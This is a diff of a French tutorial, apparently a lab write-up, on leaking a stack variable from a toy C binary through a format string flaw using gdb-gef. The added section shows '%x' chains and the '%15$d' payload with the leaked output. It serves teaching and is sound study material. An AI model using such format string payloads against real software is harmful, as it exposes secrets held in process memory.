@@ -24,9 +24,7 @@ Ouvrons gdb-gef et mettons un break juste apres le printf de notre buffer, pour 
 
 ```sh
 └─$ gdb printf-leak
-
 # ...
-
 gef➤  disas main
 Dump of assembler code for function main:
    0x0000000000401146 <+0>:	push   rbp
@@ -56,10 +54,9 @@ Dump of assembler code for function main:
    0x00000000004011af <+105>:	leave
    0x00000000004011b0 <+106>:	ret
 End of assembler dump.
-gef➤  
 ```
 
-Ici on peut voir que le printf de notre buffer se trouve à `main+95` donc mettons notre break juste apres et lançons le 
+Ici on peut voir que le printf de notre buffer se trouve à `main+95` donc mettons notre break juste apres et lançons-le 
 
 ```sh
 gef➤  b *main+100
@@ -125,5 +122,37 @@ Donc pour revenir à notre exemple:
 `0x..dad0` -> `4056fb`
 `0x..dad8` -> `4`
 
-Comme repéré precedement, notre `secret` se trouve en `$rbp-0x8` or `$rbp` vaut `$rbp   : 0x00007fffffffdbc0` donc notre secret est ici stocké en `0x..dbb8` ce qui correspond à notre premier %x !
-Or, le secret est un `long` donc 8 octets, il suffit donc d'utiliser `%ld` pour afficher la premiere valeur sur 8 octets sous forme d'entier.
+Comme repéré precedement, notre `secret` se trouve en `$rbp-0x8` or `$rbp   : 0x00007fffffffdbc0` donc notre secret est ici stocké en `0x..dbb8` ce qui est bien plus bas dans la stack.
+En tentant avec plus de `%x` nous pouvons voir que la 15eme valeur correspond à celle présente en `0x..dbb8` visible dans le hexdump:
+
+```sh
+Votre nom: %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
+Bonjour, 6a6e6f42 0 0 4056dd 4 25207825 20782520 78252078 25207825 20782520 78252078 0 f7fe5030 0 6b8b4567
+
+gef➤  hexdump byte $sp -s 112
+0x00007fffffffdb70     25 78 20 25 78 20 25 78 20 25 78 20 25 78 20 25    %x %x %x %x %x %
+0x00007fffffffdb80     78 20 25 78 20 25 78 20 25 78 20 25 78 20 25 78    x %x %x %x %x %x
+0x00007fffffffdb90     20 25 78 20 25 78 20 25 78 20 25 78 0a 00 00 00     %x %x %x %x....
+0x00007fffffffdba0     00 00 00 00 00 00 00 00 30 50 fe f7 ff 7f 00 00    ........0P......
+0x00007fffffffdbb0     00 00 00 00 00 00 00 00 67 45 8b 6b 00 00 00 00    ........gE.k....
+0x00007fffffffdbc0     02 00 00 00 00 00 00 00 68 ad dd f7 ff 7f 00 00    ........h.......
+0x00007fffffffdbd0     c0 dc ff ff ff 7f 00 00 46 11 40 00 00 00 00 00    ........F.@.....
+```
+
+Il nous reste plus qu'a récuperer cette valeur sous forme d'entier grâce à `%d`
+
+```sh
+└─$ ./printf-leak
+Votre nom: %x %x %x %x %x %x %x %x %x %x %x %x %x %x %d 
+Bonjour, 6a6e6f42 0 0 aa6e6de 4 25207825 20782520 78252078 25207825 20782520 64252078 0 67fa4030 0 1804289383
+```
+
+Ou plus simplement dans le cas où l'on connait l'index (15 ici) de la valeur, `%15$d` est plus direct, et indispensable dans le cas d'un buffer petit pour notre input.
+
+```sh
+└─$ ./printf-leak
+Votre nom: %15$d
+Bonjour, 1804289383
+```
+
+Rappel: `%<index>$<format>`
